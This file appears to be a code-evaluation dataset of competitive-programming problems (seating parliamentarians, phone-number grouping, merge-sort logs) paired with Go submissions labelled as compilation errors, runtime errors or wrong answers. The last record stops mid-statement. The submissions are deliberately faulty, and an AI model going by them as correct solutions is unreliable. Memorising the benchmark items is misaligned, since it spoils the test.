{"difficulty":1000,"lang":"Go","lang_cluster":"go","src_uid":"6e0dafeaf85e92f959c388c72e158f68","submission_id":"re_857","tags":["constructive algorithms","*special"],"exec_outcome":"COMPILATION_ERROR","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"runtime\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tget := wrapStdin()\n\tn, a, b := get.Int(), get.Int(), get.Int()\n\n\tif a*b < n {\n\t\tfmt.Println(-1)\n\t\tfmt.Fprintf(os.Stderr, runtime.GOMAXPROCS(0))\n\t\treturn\n\t}\n\n\tg := func(b int) func() int {\n\t\treturn func() int {\n\t\t\tt := b\n\t\t\tb += 2\n\t\t\tif t > n {\n\t\t\t\tt = 0\n\t\t\t}\n\t\t\treturn t\n\t\t}\n\t}\n\tev, od := g(2), g(1)\n\n\tfor i := 0; i < a; i++ {\n\t\tfor j := 0; j < b; j++ {\n\t\t\tvar x int\n\t\t\tif (i^j)&1 == 0 {\n\t\t\t\tx = od()\n\t\t\t} else {\n\t\t\t\tx = ev()\n\t\t\t}\n\t\t\tfmt.Printf(\"%d \", x)\n\t\t}\n\t\tfmt.Printf(\"\\n\")\n\t}\n}\n\ntype Input struct {\n\t*bufio.Scanner\n}\n\nfunc wrapStdin() Input {\n\tsc := bufio.NewScanner(os.Stdin)\n\tsc.Split(bufio.ScanWords)\n\treturn Input{Scanner: sc}\n}\nfunc (in Input) Int() int {\n\tin.Scan()\n\tx, _ := strconv.Atoi(in.Text())\n\treturn x\n}\nfunc (in Input) IntOk() (int, bool) {\n\tok := in.Scan()\n\tx, _ := strconv.Atoi(in.Text())\n\treturn x, ok\n}\n","description":"There are n parliamentarians in Berland. They are numbered with integers from 1 to n. It happened that all parliamentarians with odd indices are Democrats and all parliamentarians with even indices are Republicans.New parliament assembly hall is a rectangle consisting of a\u2009\u00d7\u2009b chairs\u00a0\u2014 a rows of b chairs each. Two chairs are considered neighbouring if they share as side. For example, chair number 5 in row number 2 is neighbouring to chairs number 4 and 6 in this row and chairs with number 5 in rows 1 and 3. Thus, chairs have four neighbours in general, except for the chairs on the border of the hallWe know that if two parliamentarians from one political party (that is two Democrats or two Republicans) seat nearby they spent all time discussing internal party issues.Write the program that given the number of parliamentarians and the sizes of the hall determine if there is a way to find a seat for any parliamentarian, such that no two members of the same party share neighbouring seats.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n, a and b (1\u2009\u2264\u2009n\u2009\u2264\u200910\u2009000, 1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009100)\u00a0\u2014 the number of parliamentarians, the number of rows in the assembly hall and the number of seats in each row, respectively.","output_spec":"If there is no way to assigns seats to parliamentarians in a proper way print -1. Otherwise print the solution in a lines, each containing b integers. The j-th integer of the i-th line should be equal to the index of parliamentarian occupying this seat, or 0 if this seat should remain empty. If there are multiple possible solution, you may print any of them.","notes":"NoteIn the first sample there are many other possible solutions. For example, 3 20 1and 2 13 0The following assignment 3 21 0is incorrect, because parliamentarians 1 and 3 are both from Democrats party but will occupy neighbouring seats.","sample_inputs":["3 2 2","8 4 3","10 2 2"],"sample_outputs":["0 3\n1 2","7 8 3\n0 1 4\n6 0 5\n0 2 0","-1"]}
{"difficulty":1100,"lang":"Go","lang_cluster":"go","src_uid":"6f6859aabc1c9cbb9ee0d910064d87c2","submission_id":"re_1154","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/ 25B\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar i, n int\n\tvar s string\n\tfmt.Scan(&n, &s)\n\tfor i = 0; i < n-2-n%2; i += 2 {\n\t\tfmt.Print(s[i], s[i+1], string('-'))\n\t}\n\tfmt.Println(s[i : n-i])\n}\n","description":"Phone number in Berland is a sequence of n digits. Often, to make it easier to memorize the number, it is divided into groups of two or three digits. For example, the phone number 1198733 is easier to remember as 11-987-33. Your task is to find for a given phone number any of its divisions into groups of two or three digits.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of digits in the phone number. The second line contains n digits \u2014 the phone number to divide into groups.","output_spec":"Output any of divisions of the given phone number into groups of two or three digits. Separate groups by single character -. If the answer is not unique, output any.","notes":null,"sample_inputs":["6\n549871","7\n1198733"],"sample_outputs":["54-98-71","11-987-33"]}
{"difficulty":800,"lang":"Go","lang_cluster":"go","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_1518","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar input, x int\n\tx=1\n\tfmt.Scan(&input)\n\tfor i:=1; i<input; i++ {\n\t\tx+=i\n\t\tif x>input {\n\t\t\tfmt.Println(x%input)\n\t\t} else {\n\t\t\tfmt.Println(x)\n\t\t}\n\t}\n}","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1400,"lang":"Go","lang_cluster":"go","src_uid":"77_A","submission_id":"112115361","tags":["brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\r\n\r\nimport (\r\n\t\"fmt\"\r\n\t\"math\"\r\n)\r\n\r\nfunc main() {\r\n\tvar n int\r\n\tfmt.Scanf(\"%d\\n\", &n)\r\n\tvar a, b string\r\n\tlikes := map[string]map[string]int{}\r\n\tfor i := 0; i < n; i++ {\r\n\t\tfmt.Scanf(\"%s likes %s\\n\", &a, &b)\r\n\t\t_, ok := likes[a]\r\n\t\tif !ok {\r\n\t\t\tlikes[a] = map[string]int{}\r\n\t\t}\r\n\t\tlikes[a][b] = 1\r\n\t}\r\n\tvar n1, n2, n3 int\r\n\tfmt.Scanf(\"%d %d %d\\n\", &n1, &n2, &n3)\r\n\theroes := []string{\"Anka\", \"Chapay\", \"Cleo\", \"Troll\", \"Dracul\", \"Snowy\", \"Hexadecimal\"}\r\n\tans1, ans2 := math.MaxInt32, math.MinInt32\r\n\tg1, g2, g3 := 0, 0, 0\r\n\tfor i := 1; i <= 5; i++ {\r\n\t\tfor j := 1; j <= 5; j++ {\r\n\t\t\tif i+j >= 7 {\r\n\t\t\t\tcontinue\r\n\t\t\t}\r\n\t\t\tk := 7 - i - j\r\n\t\t\tt := calc(n1\/i, n2\/j, n3\/k)\r\n\t\t\tif t < ans1 {\r\n\t\t\t\tans1 = t\r\n\t\t\t\tg1, g2, g3 = i, j, k\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tvar i, j, k uint\r\n\tvar t int\r\n\tfor i = 0; i < 128; i++ {\r\n\t\tif count(i) != g1 {\r\n\t\t\tcontinue\r\n\t\t}\r\n\t\tfor j = 0; j < 128; j++ {\r\n\t\t\tif count(j) != g2 {\r\n\t\t\t\tcontinue\r\n\t\t\t}\r\n\t\t\tk = 127 - i - j\r\n\t\t\tif count(k) != g3 {\r\n\t\t\t\tcontinue\r\n\t\t\t}\r\n\t\t\tt = calc2(i, heroes, likes) + calc2(j, heroes, likes) + calc2(k, heroes, likes)\r\n\t\t\tif t > ans2 {\r\n\t\t\t\tans2 = t\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tfmt.Println(ans1, ans2)\r\n}\r\n\r\nfunc calc2(n uint, h []string, l map[string]map[string]int) int {\r\n\tans := 0\r\n\tq := []int{}\r\n\tfor i := 0; i < 7; i++ {\r\n\t\tif n&(1<<i) != 0 {\r\n\t\t\tq = append(q, i)\r\n\t\t}\r\n\t}\r\n\r\n\tfor i := 0; i < len(q); i++ {\r\n\t\tfor j := i + 1; j < len(q); j++ {\r\n\t\t\tif l[h[q[i]]][h[q[j]]] == 1 {\r\n\t\t\t\tans++\r\n\t\t\t}\r\n\t\t\tif l[h[q[j]]][h[q[i]]] == 1 {\r\n\t\t\t\tans++\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn ans\r\n}\r\n\r\nfunc count(n uint) int {\r\n\tans := 0\r\n\tfor n != 0 {\r\n\t\tans++\r\n\t\tn = n & (n - 1)\r\n\t}\r\n\treturn ans\r\n}\r\n\r\nfunc calc(a, b, c int) int {\r\n\tif a < b {\r\n\t\ta, b = b, a\r\n\t}\r\n\tif b > c {\r\n\t\treturn a - c\r\n\t}\r\n\tif c > a {\r\n\t\treturn c - b\r\n\t}\r\n\treturn a - b\r\n}\r\n","description":"The year of 2012 is coming...According to an ancient choradrican legend in this very year, in 2012, Diablo and his brothers Mephisto and Baal will escape from hell, and innumerable hordes of demons will enslave the human world. But seven brave heroes have already gathered on the top of a mountain Arreat to protect us mere mortals from the effect of this terrible evil.The seven great heroes are: amazon Anka, barbarian Chapay, sorceress Cleo, druid Troll, necromancer Dracul, paladin Snowy and a professional hit girl Hexadecimal. Heroes already know how much experience will be given for each of the three megabosses: a for Mephisto, b for Diablo and c for Baal.Here's the problem: heroes are as much as seven and megabosses are only three! Then our heroes decided to split into three teams, where each team will go to destroy their own megaboss. Each team member will receive a  of experience, rounded down, where x will be the amount of experience for the killed megaboss and y \u2014 the number of people in the team.Heroes do not want to hurt each other's feelings, so they want to split into teams so that the difference between the hero who received the maximum number of experience and the hero who received the minimum number of experience were minimal. Since there can be several divisions into teams, then you need to find the one in which the total amount of liking in teams were maximum.It is known that some heroes like others. But if hero p likes hero q, this does not mean that the hero q likes hero p. No hero likes himself.The total amount of liking in teams is the amount of ordered pairs (p,q), such that heroes p and q are in the same group, and hero p likes hero q (but it is not important if hero q likes hero p). In case of heroes p and q likes each other and they are in the same group, this pair should be counted twice, as (p,q) and (q,p).A team can consist even of a single hero, but it is important that every megaboss was destroyed. All heroes must be involved in the campaign against evil. None of the heroes can be in more than one team.It is guaranteed that every hero is able to destroy any megaboss alone.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single non-negative integer n (0\u2264n\u226442) \u2014 amount of liking between the heroes. Next n lines describe liking in the form \"p likes q\", meaning that the hero p likes the hero q (p \u2260 q). Every liking is described in the input exactly once, no hero likes himself.\nIn the last line are given three integers a, b and c (1\u2264a,b,c\u22642\u00b710^9), separated by spaces: the experience for Mephisto, the experience for Diablo and experience for Baal.\nIn all the pretests, except for examples from the statement, the following condition is satisfied: a=b=c.\n","output_spec":"Print two integers \u2014 the minimal difference in the experience between two heroes who will receive the maximum and minimum number of experience points, and the maximal total amount of liking in teams (the number of friendships between heroes that end up in one team).\nWhen calculating the second answer, the team division should satisfy the difference-minimizing contraint. I.e. primary you should minimize the difference in the experience and secondary you should maximize the total amount of liking.\n","notes":"A note to first example: it the first team should be Dracul, Troll and Anka, in the second one Hexadecimal and Snowy, and in the third Cleo \u0438 Chapay.\n","sample_inputs":["3\nTroll likes Dracul\nDracul likes Anka\nSnowy likes Hexadecimal\n210 200 180\n","2\nAnka likes Chapay\nChapay likes Anka\n10000 50 50\n"],"sample_outputs":["30 3\n","1950 2\n"]}
{"difficulty":1300,"lang":"Go","lang_cluster":"go","src_uid":"782b819eb0bfc86d6f96f15ac09d5085","submission_id":"re_1211","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\nimport \"fmt\"\nimport \"math\"\n\nfunc main(){\n\tvar n,ans,i int64\n\tfmt.Scan(&n)\n\tx:=int64(math.Sqrt(math.Pow(4,float64(n))))\n\tfor i=1; i<=x;i++{ans+=i}\n\tfmt.Println(ans)\n}","description":"Dwarfs have planted a very interesting plant, which is a triangle directed \"upwards\". This plant has an amusing feature. After one year a triangle plant directed \"upwards\" divides into four triangle plants: three of them will point \"upwards\" and one will point \"downwards\". After another year, each triangle plant divides into four triangle plants: three of them will be directed in the same direction as the parent plant, and one of them will be directed in the opposite direction. Then each year the process repeats. The figure below illustrates this process.  Help the dwarfs find out how many triangle plants that point \"upwards\" will be in n years.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (0\u2009\u2264\u2009n\u2009\u2264\u20091018) \u2014 the number of full years when the plant grew. Please do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"Print a single integer \u2014 the remainder of dividing the number of plants that will point \"upwards\" in n years by 1000000007 (109\u2009+\u20097).","notes":"NoteThe first test sample corresponds to the second triangle on the figure in the statement. The second test sample corresponds to the third one.","sample_inputs":["1","2"],"sample_outputs":["3","10"]}
{"difficulty":1500,"lang":"Go","lang_cluster":"go","src_uid":"88_B","submission_id":"60303497","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\r\n\r\nimport (\r\n  \"fmt\"\r\n  \"math\"\r\n  \"unicode\"\r\n)\r\n\r\ntype Key struct {\r\n  x,y float64\r\n}\r\ntype Keyboard struct {\r\n  m map[rune][]Key\r\n}\r\n\r\nfunc main() {\r\n  hand := 0\r\n  keyboard := Keyboard{}\r\n  keyboard.m = make(map[rune][]Key)\r\n  var m,n int\r\n  var x float64\r\n  var no_sense string\r\n  fmt.Scanf(\"%d %d %f\", &m,&n,&x)\r\n  fmt.Scanf(\"%s\", &no_sense)\r\n  for i := 0; i < m; i++ {\r\n    var keys string\r\n    fmt.Scanf(\"%s\", &keys)\r\n    fmt.Scanf(\"%s\", &no_sense)\r\n    for pos,char:= range keys{\r\n      keyboard.m[char] = append(keyboard.m[char],Key{float64(i)+0.5,float64(pos)+0.5,})\r\n    }\r\n  }\r\n  var e,text string\r\n  fmt.Scanf(\"%s\", &e)\r\n  fmt.Scanf(\"%s\", &no_sense)\r\n  fmt.Scanf(\"%s\", &text)\r\n  s_key := 'S'\r\n  for _,char:= range text{\r\n    v1, e1 := keyboard.m[unicode.ToLower(char)]\r\n    if !e1{\r\n      hand = -1\r\n      break\r\n    }\r\n    if unicode.IsUpper(char) {\r\n      one_hand := false\r\n      v2, e2 := keyboard.m[s_key]\r\n      if !e2{\r\n        hand = -1\r\n        break\r\n      }\r\n      for _,k1:= range v2{\r\n        for _,k2:= range v1{\r\n          if keyboard.e_distance(k1, k2) <= x*x{\r\n            one_hand = true\r\n            break\r\n          }\r\n        }\r\n      }\r\n      if !one_hand {\r\n        hand++\r\n      }\r\n    }\r\n  }\r\n  fmt.Println(hand)\r\n}\r\n    \r\nfunc (Keyboard) e_distance(k1 Key, k2 Key) float64{\r\n  return math.Pow(k1.x - k2.x, 2) + math.Pow(k1.y - k2.y, 2)\r\n}","description":"Vasya learns to type. He has an unusual keyboard at his disposal: it is rectangular and it has n rows of keys containing m keys in each row. Besides, the keys are of two types. Some of the keys have lowercase Latin letters on them and some of the keys work like the \"Shift\" key on standard keyboards, that is, they make lowercase letters uppercase.Vasya can press one or two keys with one hand. However, he can only press two keys if the Euclidean distance between the centers of the keys does not exceed x. The keys are considered as squares with a side equal to 1. There are no empty spaces between neighbouring keys.Vasya is a very lazy boy, that's why he tries to type with one hand as he eats chips with his other one. However, it is possible that some symbol can't be typed with one hand only, because the distance between it and the closest \"Shift\" key is strictly larger than x. In this case he will have to use his other hand. Having typed the symbol, Vasya returns other hand back to the chips.You are given Vasya's keyboard and the text. Count the minimum number of times Vasya will have to use the other hand.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers n, m, x (1\u2264n,m\u226430,1\u2264x\u226450).\nNext n lines contain descriptions of all the keyboard keys. Each line contains the descriptions of exactly m keys, without spaces. The letter keys are marked with the corresponding lowercase letters. The \"Shift\" keys are marked with the \"S\" symbol. \nThen follow the length of the text q (1\u2264q\u22645\u00b710^5). The last line contains the text T, which consists of q symbols, which are uppercase and lowercase Latin letters.\n","output_spec":"If Vasya can type the text, then print the minimum number of times he will have to use his other hand. Otherwise, print \"-1\" (without the quotes).\n","notes":"In the first sample the symbol \"A\" is impossible to print as there's no \"Shift\" key on the keyboard.\nIn the second sample the symbol \"e\" is impossible to print as there's no such key on the keyboard.\nIn the fourth sample the symbols \"T\", \"G\" are impossible to print with one hand. The other letters that are on the keyboard can be printed. Those symbols come up in the text twice, thus, the answer is 2.\n","sample_inputs":["2 2 1\nab\ncd\n1\nA\n","2 2 1\nab\ncd\n1\ne\n","2 2 1\nab\ncS\n5\nabcBA\n","3 9 4\nqwertyuio\nasdfghjkl\nSzxcvbnmS\n35\nTheQuIcKbRoWnFOXjummsovertHeLazYDOG\n"],"sample_outputs":["-1\n","-1\n","1\n","2\n"]}
{"difficulty":1300,"lang":"Go","lang_cluster":"go","src_uid":"92_B","submission_id":"8369905","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ 92B\r\npackage main\r\n\r\nimport (\r\n\t\"bufio\"\r\n\t\"fmt\"\r\n\t\"os\"\r\n)\r\n\r\nfunc main() {\r\n\tvar s string\r\n\tin := bufio.NewReader(os.Stdin)\r\n\tfmt.Fscan(in, &s)\r\n\tvar a, b, c int\r\n\tfor i := 1; i < len(s); i++ {\r\n\t\tif s[i] == 1 {\r\n\t\t\ta = i\r\n\t\t\tb = c\r\n\t\t} else {\r\n\t\t\tc++\r\n\t\t\tif a > 0 {\r\n\t\t\t\tb += a*2 - 1\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tfmt.Println(b + c)\r\n}\r\n","description":"Little walrus Fangy loves math very much. That's why when he is bored he plays with a number performing some operations.Fangy takes some positive integer x and wants to get a number one from it. While x is not equal to 1, Fangy repeats the following action: if x is odd, then he adds 1 to it, otherwise he divides x by 2. Fangy knows that for any positive integer number the process ends in finite time.How many actions should Fangy perform to get a number one from number x?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer x in a binary system. It is guaranteed that the first digit of x is different from a zero and the number of its digits does not exceed 10^6.\n","output_spec":"Print the required number of actions.\n","notes":"Let's consider the third sample. Number 101110 is even, which means that we should divide it by 2. After the dividing Fangy gets an odd number 10111 and adds one to it. Number 11000 can be divided by 2 three times in a row and get number 11. All that's left is to increase the number by one (we get 100), and then divide it by 2 two times in a row. As a result, we get 1.\n","sample_inputs":["1\n","1001001\n","101110\n"],"sample_outputs":["0\n","12\n","8\n"]}
{"difficulty":1100,"lang":"Go","lang_cluster":"go","src_uid":"9c90974a0bb860a5e180760042fd5045","submission_id":"re_1146","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"io\"\n\t\"os\"\n)\n\nconst MAX_NM = 100\nconst MAX_CHAR = int('z')\n\nfunc main() {\n\treader := NewStdReader(os.Stdin)\n\n\tn, m := reader.ReadInt(), reader.ReadInt()\n\n\tcountRow := [MAX_NM][MAX_CHAR]byte{}\n\tcountCol := [MAX_NM][MAX_CHAR]byte{}\n\n\ttable := [MAX_NM][MAX_NM]byte{}\n\n\tfor i := 0; i < n; i++ {\n\t\tfor j := 0; j < m; j++ {\n\t\t\tc := reader.ReadChar()\n\t\t\ttable[i][j] = c\n\t\t\tcountRow[i][c]++\n\t\t\tcountCol[j][c]++\n\t\t}\n\t}\n\n\tfor i := 0; i < n; i++ {\n\t\tfor j := 0; j < m; j++ {\n\t\t\tc := table[i][j]\n\n\t\t\tif countRow[i][c] == 1 && countCol[j][c] == 1 {\n\t\t\t\tfmt.Print(string(c))\n\t\t\t}\n\t\t}\n\t}\n}\n\ntype StdReader struct {\n\tbuf *bufio.Reader\n}\n\nfunc NewStdReader(reader io.Reader) *StdReader {\n\treturn &StdReader{bufio.NewReaderSize(reader, 20*1024*1024)}\n}\n\nfunc (std *StdReader) ReadInt() int {\n\n\tr := 0\n\tsign := 1\n\tok := false\n\n\tfor {\n\t\tb, e := std.buf.ReadByte()\n\n\t\tif e != nil {\n\t\t\tbreak\n\t\t}\n\t\tif b >= '0' && b <= '9' {\n\t\t\tr = r*10 + int(b-'0')\n\t\t\tok = true\n\t\t} else {\n\t\t\tif ok {\n\t\t\t\tbreak\n\t\t\t} else {\n\t\t\t\tif b == '-' {\n\t\t\t\t\tsign = -sign\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn sign * r\n}\n\nfunc (std *StdReader) ReadChar() byte {\n\tfor {\n\t\tb, e := std.buf.ReadByte()\n\n\t\tif e != nil {\n\t\t\tbreak\n\t\t}\n\n\t\tif b >= 'a' && b <= 'z' {\n\t\t\treturn b\n\t\t}\n\t}\n\n\treturn 0\n}\n","description":"An African crossword is a rectangular table n\u2009\u00d7\u2009m in size. Each cell of the table contains exactly one letter. This table (it is also referred to as grid) contains some encrypted word that needs to be decoded.To solve the crossword you should cross out all repeated letters in rows and columns. In other words, a letter should only be crossed out if and only if the corresponding column or row contains at least one more letter that is exactly the same. Besides, all such letters are crossed out simultaneously.When all repeated letters have been crossed out, we should write the remaining letters in a string. The letters that occupy a higher position follow before the letters that occupy a lower position. If the letters are located in one row, then the letter to the left goes first. The resulting word is the answer to the problem.You are suggested to solve an African crossword and print the word encrypted there.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100). Next n lines contain m lowercase Latin letters each. That is the crossword grid.","output_spec":"Print the encrypted word on a single line. It is guaranteed that the answer consists of at least one letter.","notes":null,"sample_inputs":["3 3\ncba\nbcd\ncbc","5 5\nfcofd\nooedo\nafaoa\nrdcdf\neofsf"],"sample_outputs":["abcd","codeforces"]}
{"difficulty":1400,"lang":"Go","lang_cluster":"go","src_uid":"a37df9b239a40473516d1525d56a0da7","submission_id":"re_1071","tags":["combinatorics"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strconv\"\n)\n\nvar (\n\tin  = bufio.NewScanner(os.Stdin)\n\tout = bufio.NewWriter(os.Stdout)\n)\n\nvar (\n\tMOD = 1000000007\n)\n\nvar (\n\tn, m int\n\ta    [100][30]int\n\ts    [100]string\n)\n\nfunc main() {\n\tdefer out.Flush()\n\tin.Split(bufio.ScanWords)\n\n\tfmt.Scan(&n, &m)\n\tfor i := 0; i < n; i++ {\n\t\tfmt.Scan(&s[i])\n\t}\n\n\tfor i := 0; i < n; i++ {\n\t\tfor j := 0; j < len(s[i]); j++ {\n\t\t\ta[j][s[i][j]-65] = 1\n\t\t}\n\n\t}\n\n\tans := 1\n\tfor i := 0; i < m; i++ {\n\t\tcnt := 0\n\t\tfor j := 0; j < 26; j++ {\n\t\t\tcnt = cnt + a[i][j]\n\n\t\t}\n\t\t\/\/writeln(cnt)\n\t\tans = (ans * cnt) % MOD\n\t}\n\n\twriteln(ans)\n\n}\n\nfunc read(num ...*int) {\n\tfor _, value := range num {\n\t\tin.Scan()\n\t\t*value, _ = strconv.Atoi(in.Text())\n\t}\n}\n\nfunc writeln(num ...int) {\n\tfor _, value := range num {\n\t\tstr := strconv.Itoa(value)\n\t\tout.WriteString(str)\n\t}\n\tout.WriteString(\"\\n\")\n}\n","description":"One day little Vasya found mom's pocket book. The book had n names of her friends and unusually enough, each name was exactly m letters long. Let's number the names from 1 to n in the order in which they are written.As mom wasn't home, Vasya decided to play with names: he chose three integers i, j, k (1\u2009\u2264\u2009i\u2009&lt;\u2009j\u2009\u2264\u2009n, 1\u2009\u2264\u2009k\u2009\u2264\u2009m), then he took names number i and j and swapped their prefixes of length k. For example, if we take names \"CBDAD\" and \"AABRD\" and swap their prefixes with the length of 3, the result will be names \"AABAD\" and \"CBDRD\".You wonder how many different names Vasya can write instead of name number 1, if Vasya is allowed to perform any number of the described actions. As Vasya performs each action, he chooses numbers i, j, k independently from the previous moves and his choice is based entirely on his will. The sought number can be very large, so you should only find it modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100) \u2014 the number of names and the length of each name, correspondingly. Then n lines contain names, each name consists of exactly m uppercase Latin letters.","output_spec":"Print the single number \u2014 the number of different names that could end up in position number 1 in the pocket book after the applying the procedures described above. Print the number modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first sample Vasya can get the following names in the position number 1: \"AAB\", \"AAA\", \"BAA\" and \"BAB\".","sample_inputs":["2 3\nAAB\nBAA","4 5\nABABA\nBCGDG\nAAAAA\nYABSA"],"sample_outputs":["4","216"]}
{"difficulty":-1,"lang":"Go","lang_cluster":"go","src_uid":"b2ee84d23d73947fa84faaaebfde85c8","submission_id":"bb0d51f88e50d034aaf4971fb93c0b2c","tags":["*special","binary search"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"errors\"\n\t\"fmt\"\n\t\"io\"\n\t\"os\"\n)\n\ntype IO struct {\n\tin  io.Reader\n\tout io.Writer\n}\n\nfunc NewIO(in io.Reader, out io.Writer) *IO {\n\treturn &IO{in: bufio.NewReader(in), out: bufio.NewWriter(out)}\n}\n\nfunc (io *IO) ReadInt64() int64 {\n\tvar res int64\n\tfmt.Fscanf(io.in, \"%d\\n\", &res)\n\treturn res\n}\n\nfunc (io *IO) ReadInt() int {\n\tvar res int\n\tfmt.Fscanf(io.in, \"%d\\n\", &res)\n\treturn res\n}\n\nfunc (io *IO) ReadPairInt64() (int64, int64) {\n\tvar a, b int64\n\tfmt.Fscanf(io.in, \"%d %d\\n\", &a, &b)\n\treturn a, b\n}\n\nfunc (io *IO) ReadPairInt() (int, int) {\n\tvar a, b int\n\tfmt.Fscanf(io.in, \"%d %d\\n\", &a, &b)\n\treturn a, b\n}\n\nfunc (io *IO) ReadString() string {\n\tvar res string\n\tfmt.Fscanf(io.in, \"%s\\n\", &res)\n\treturn res\n}\n\nfunc (io *IO) ReadIntSlice(n int) []int64 {\n\tvar t int64\n\tres := make([]int64, 0, n)\n\tfor i := 0; i < n; i++ {\n\t\tfmt.Fscanf(io.in, \"%d\", &t)\n\t\tres = append(res, t)\n\t}\n\tfmt.Fscanf(io.in, \"\\n\")\n\treturn res\n}\n\ntype log struct {\n\ts string\n\ti int\n}\n\nvar errOutOfRange = errors.New(\"out of range\")\n\nfunc (l *log) left() (bool, error) {\n\tif l.i >= len(l.s) {\n\t\treturn false, errOutOfRange\n\t}\n\tc := l.s[l.i]\n\tl.i++\n\treturn c == '0', nil\n}\n\nfunc mergeSort(a []int, l *log) error {\n\tif len(a) == 1 {\n\t\treturn nil\n\t}\n\n\terr := mergeSort(a[:len(a)\/2], l)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\terr = mergeSort(a[len(a)\/2:], l)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tb := make([]int, 0, len(a))\n\ti, j := 0, len(a)\/2\n\n\tfor i < len(a) \/ 2 && j < len(a) {\n\t\tleft, err := l.left()\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tif left {\n\t\t\tb = append(b, a[i])\n\t\t\ti++\n\t\t} else {\n\t\t\tb = append(b, a[j])\n\t\t\tj++\n\t\t}\n\t}\n\n\tfor i < len(a) \/ 2 {\n\t\tb = append(b, a[i])\n\t\ti++\n\t}\n\n\tfor j < len(a) {\n\t\tb = append(b, a[j])\n\t\tj++\n\t}\n\n\tfor i := range b {\n\t\ta[i] = b[i]\n\t}\n\treturn nil\n}\n\nfunc main() {\n\tio := NewIO(os.Stdin, os.Stdout)\n\ts := io.ReadString()\n\n\taa := make([]int, 0)\n\n\tfor i := 0; i < 1000; i++ {\n\t\taa = append(aa, i)\n\n\t\ta := make([]int, len(aa))\n\t\tcopy(a, aa)\n\n\t\tl := log{s, 0}\n\t\terr := mergeSort(a, &l)\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tif _, err = l.left(); err != nil {\n\t\t\tb := make([]int, len(a))\n\n\t\t\tfor i, v := range a {\n\t\t\t\tb[v] = i + 1\n\t\t\t}\n\n\t\t\tfmt.Println(len(a))\n\t\t\tfor _, v := range b {\n\t\t\t\tfmt.Printf(\"%d \", v)\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t}\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","description":"\u0420\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0438\u043c \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u043a\u043e\u0434 \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0438 \u0441\u043b\u0438\u044f\u043d\u0438\u0435\u043c \u043d\u0430 \u044f\u0437\u044b\u043a\u0435 Python: def sort(a):  n = len(a)  b = [0 for i in range(n)]  log = []  def mergeSort(l, r):    if r - l <;= 1:      return    m = (l + r) &gt;&gt; 1    mergeSort(l, m)    mergeSort(m, r)    i, j, k = l, m, l    while i <; m and j <; r:     